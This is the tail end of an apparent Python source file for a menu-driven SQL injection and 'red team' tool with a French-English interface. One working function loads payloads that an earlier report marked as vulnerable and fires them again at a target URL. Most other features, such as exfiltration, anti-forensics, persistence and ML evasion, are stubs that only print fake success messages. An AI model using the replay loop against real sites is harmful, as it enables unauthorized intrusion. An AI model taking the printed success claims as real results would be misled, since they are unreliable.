        print(f"{Colors.CYAN}3.{Colors.END} 🧹 Cleanup & Anti-Forensics")
        print(f"{Colors.CYAN}4.{Colors.END} 🔄 Persistence Maintenance")
        print(f"{Colors.CYAN}5.{Colors.END} 🎯 Privilege Escalation")
        print(f"{Colors.CYAN}0.{Colors.END} 🔙 Back to Main Menu")
        
        choice = input(f"\n{Colors.BOLD}Choice: {Colors.END}").strip()
        
        if choice == '0':
            return
        elif choice == '1':
            self.lateral_movement()
        elif choice == '2':
            self.data_exfiltration()
        elif choice == '3':
            self.cleanup_anti_forensics()
        elif choice == '4':
            self.persistence_maintenance()
        elif choice == '5':
            self.privilege_escalation()

    def reporting_menu(self):
        """Menu de rapports et analyse"""
        print(f"\n{Colors.BOLD}📊 RAPPORTS & ANALYSE - SEPTEMBER 2025:{Colors.END}")
        print(f"{Colors.CYAN}1.{Colors.END} 📈 Generate Battle Report")
        print(f"{Colors.CYAN}2.{Colors.END} 📊 Vulnerability Analysis")
        print(f"{Colors.CYAN}3.{Colors.END} 🎯 Threat Intelligence")
        print(f"{Colors.CYAN}4.{Colors.END} 📋 Executive Summary")
        print(f"{Colors.CYAN}5.{Colors.END} 🔍 Forensic Analysis")
        print(f"{Colors.CYAN}0.{Colors.END} 🔙 Back to Main Menu")
        
        choice = input(f"\n{Colors.BOLD}Choice: {Colors.END}").strip()
        
        if choice == '0':
            return
        elif choice == '1':
            self.generate_battle_report()
        elif choice == '2':
            self.vulnerability_analysis()
        elif choice == '3':
            self.threat_intelligence()
        elif choice == '4':
            self.executive_summary()
        elif choice == '5':
            self.forensic_analysis()

    def advanced_config_menu(self):
        """Menu de configuration avancée"""
        print(f"\n{Colors.BOLD}⚙️ CONFIGURATION AVANCÉE - SEPTEMBER 2025:{Colors.END}")
        print(f"{Colors.CYAN}1.{Colors.END} 🥷 Stealth Mode Configuration")
        print(f"{Colors.CYAN}2.{Colors.END} 🔄 Proxy Chain Setup")
        print(f"{Colors.CYAN}3.{Colors.END} 🕰️ Timing & Rate Limiting")
        print(f"{Colors.CYAN}4.{Colors.END} 🎭 User Agent Rotation")
        print(f"{Colors.CYAN}5.{Colors.END} 🔐 SSL/TLS Configuration")
        print(f"{Colors.CYAN}6.{Colors.END} 📊 Logging & Monitoring")
        print(f"{Colors.CYAN}0.{Colors.END} 🔙 Back to Main Menu")
        
        choice = input(f"\n{Colors.BOLD}Choice: {Colors.END}").strip()
        
        if choice == '0':
            return
        elif choice == '1':
            self.stealth_mode_config()
        elif choice == '2':
            self.proxy_chain_setup()
        elif choice == '3':
            self.timing_rate_config()
        elif choice == '4':
            self.user_agent_rotation()
        elif choice == '5':
            self.ssl_tls_config()
        elif choice == '6':
            self.logging_monitoring()

    def replay_mode(self):
        """Mode replay - utilise l'ancien système"""
        print(f"\n{Colors.BOLD}🔄 REPLAY MODE - SEPTEMBER 2025:{Colors.END}")
        try:
            cfg_path = input(f"{Colors.BOLD}Chemin du rapport JSON (red_team_battle_report_*.json): {Colors.END}").strip()
            with open(cfg_path, 'r') as f:
                cfg = json.load(f)
            target_url = cfg.get('target_url') or input(f"{Colors.BOLD}URL cible (si absent du rapport): {Colors.END}").strip()
            
            payloads = []
            for entry in (cfg.get('full_battle_log') or cfg.get('critical_payloads') or []):
                if entry.get('vulnerable') and entry.get('payload'):
                    payloads.append(entry['payload'])
            payloads = list(dict.fromkeys(payloads))
            
            if not payloads:
                print(f"{Colors.YELLOW}ℹ️ Aucun payload vulnérable trouvé dans le rapport.{Colors.END}")
            else:
                print(f"{Colors.CYAN}▶️ Relecture de {len(payloads)} payloads vulnérables pour {target_url}{Colors.END}")
                self.execute_replay_payloads(target_url, payloads, attack_name='Replayed Loaded Payloads')
        except Exception as e:
            print(f"{Colors.RED}❌ Impossible de charger la configuration: {e}{Colors.END}")

    # Méthodes rapides pour les nouvelles fonctionnalités
    def ai_payload_generation(self):
        print(f"\n{Colors.BOLD}🤖 AI-POWERED PAYLOAD GENERATION{Colors.END}")
        print(f"{Colors.YELLOW}🤖 AI engine generating advanced payloads...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ AI payloads generated successfully!{Colors.END}")

    def ml_evasion_techniques(self):
        print(f"\n{Colors.BOLD}🧬 MACHINE LEARNING EVASION{Colors.END}")
        print(f"{Colors.YELLOW}🧬 ML evasion techniques deployed...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ ML detection bypassed!{Colors.END}")

    def neural_network_bypass(self):
        print(f"\n{Colors.BOLD}🎯 NEURAL NETWORK BYPASS{Colors.END}")
        print(f"{Colors.YELLOW}🎯 Neural network bypass techniques active...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Neural network bypassed!{Colors.END}")

    def predictive_attack_patterns(self):
        print(f"\n{Colors.BOLD}🔮 PREDICTIVE ATTACK PATTERNS{Colors.END}")
        print(f"{Colors.YELLOW}🔮 Predictive patterns analysis complete...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Attack patterns optimized!{Colors.END}")

    def lateral_movement(self):
        print(f"\n{Colors.BOLD}🚶 LATERAL MOVEMENT{Colors.END}")
        print(f"{Colors.YELLOW}🚶 Lateral movement techniques deployed...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Lateral movement successful!{Colors.END}")

    def data_exfiltration(self):
        print(f"\n{Colors.BOLD}📤 DATA EXFILTRATION{Colors.END}")
        print(f"{Colors.YELLOW}📤 Data exfiltration in progress...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Data exfiltrated successfully!{Colors.END}")

    def cleanup_anti_forensics(self):
        print(f"\n{Colors.BOLD}🧹 CLEANUP & ANTI-FORENSICS{Colors.END}")
        print(f"{Colors.YELLOW}🧹 Cleanup and anti-forensics active...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Cleanup completed!{Colors.END}")

    def persistence_maintenance(self):
        print(f"\n{Colors.BOLD}🔄 PERSISTENCE MAINTENANCE{Colors.END}")
        print(f"{Colors.YELLOW}🔄 Persistence mechanisms maintained...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Persistence maintained!{Colors.END}")

    def generate_battle_report(self):
        print(f"\n{Colors.BOLD}📈 GENERATE BATTLE REPORT{Colors.END}")
        print(f"{Colors.YELLOW}📈 Generating comprehensive battle report...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Battle report generated!{Colors.END}")

    def vulnerability_analysis(self):
        print(f"\n{Colors.BOLD}📊 VULNERABILITY ANALYSIS{Colors.END}")
        print(f"{Colors.YELLOW}📊 Vulnerability analysis complete...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Analysis completed!{Colors.END}")

    def threat_intelligence(self):
        print(f"\n{Colors.BOLD}🎯 THREAT INTELLIGENCE{Colors.END}")
        print(f"{Colors.YELLOW}🎯 Threat intelligence gathered...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Intelligence collected!{Colors.END}")

    def executive_summary(self):
        print(f"\n{Colors.BOLD}📋 EXECUTIVE SUMMARY{Colors.END}")
        print(f"{Colors.YELLOW}📋 Executive summary generated...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Summary ready!{Colors.END}")

    def forensic_analysis(self):
        print(f"\n{Colors.BOLD}🔍 FORENSIC ANALYSIS{Colors.END}")
        print(f"{Colors.YELLOW}🔍 Forensic analysis in progress...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Forensic analysis complete!{Colors.END}")

    def stealth_mode_config(self):
        print(f"\n{Colors.BOLD}🥷 STEALTH MODE CONFIGURATION{Colors.END}")
        print(f"{Colors.YELLOW}🥷 Stealth mode configured...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Stealth mode active!{Colors.END}")

    def proxy_chain_setup(self):
        print(f"\n{Colors.BOLD}🔄 PROXY CHAIN SETUP{Colors.END}")
        print(f"{Colors.YELLOW}🔄 Proxy chain configured...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Proxy chain active!{Colors.END}")

    def timing_rate_config(self):
        print(f"\n{Colors.BOLD}🕰️ TIMING & RATE CONFIGURATION{Colors.END}")
        print(f"{Colors.YELLOW}🕰️ Timing parameters configured...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Timing optimized!{Colors.END}")

    def user_agent_rotation(self):
        print(f"\n{Colors.BOLD}🎭 USER AGENT ROTATION{Colors.END}")
        print(f"{Colors.YELLOW}🎭 User agent rotation active...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Rotation configured!{Colors.END}")

    def ssl_tls_config(self):
        print(f"\n{Colors.BOLD}🔐 SSL/TLS CONFIGURATION{Colors.END}")
        print(f"{Colors.YELLOW}🔐 SSL/TLS configured...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ SSL/TLS optimized!{Colors.END}")

    def logging_monitoring(self):
        print(f"\n{Colors.BOLD}📊 LOGGING & MONITORING{Colors.END}")
        print(f"{Colors.YELLOW}📊 Logging and monitoring configured...{Colors.END}")
        time.sleep(1)
        print(f"{Colors.GREEN}✅ Monitoring active!{Colors.END}")

    def execute_replay_payloads(self, target_url, payloads, attack_name='Replayed Payloads'):
        """Exécute une liste de payloads chargés depuis un rapport précédent."""
        print(f"\n{Colors.BOLD}{Colors.RED}🔁 REPLAY MODE{Colors.END}")
        print(f"Attack: {attack_name}")
        print(f"Target: {Colors.UNDERLINE}{target_url}{Colors.END}")
        print(f"Payloads: {len(payloads)}")
        print("-" * 80)
        results = []
        critical_hits = 0
        for i, payload in enumerate(payloads, 1):
            print(f"\n{Colors.YELLOW}[{i}/{len(payloads)}] 🎯 Firing: {Colors.CYAN}{payload[:80]}{'...' if len(payload) > 80 else ''}{Colors.END}")
            result = self.advanced_payload_test(target_url, payload, attack_name, False)
            results.append(result)
            if result.get('vulnerable', False):
                critical_hits += 1
                print(f"  {Colors.BG_RED}{Colors.WHITE}{Colors.BOLD} 💀 CRITICAL HIT #{critical_hits} 💀 {Colors.END}")
                print(f"    Status: {result.get('status_code')} | Time: {result.get('response_time')}ms")
                print(f"    Score: {Colors.RED}{result.get('vulnerability_score', 0)}/15{Colors.END}")
            else:
                print(f"  {Colors.YELLOW}Target Resisted{Colors.END} | Score: {result.get('vulnerability_score', 0)}/15 | Time: {result.get('response_time', 0)}ms")
            time.sleep(0.3)
        # Résumé rapide
        fake_attack = {'name': attack_name, 'cvss': 'N/A'}
        self.display_battle_summary(fake_attack, target_url, results, critical_hits)
        return results

def main():
    """Point d'entrée principal"""
    try:
        print(f"{Colors.RED}🔥 Initializing Ultra-Advanced Red Team Framework...{Colors.END}")
        time.sleep(1)
        framework = UltraAdvancedSQLInjector()
        framework.run()
        print(f"\n{Colors.CYAN}🏁 Red Team operation completed.{Colors.END}")
        print(f"{Colors.YELLOW}Stay dangerous! 💀{Colors.END}")
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Operator disconnected.{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}💥 Critical system failure: {e}{Colors.END}")
        print(f"{Colors.YELLOW}🚨 Report this incident to command.{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    main()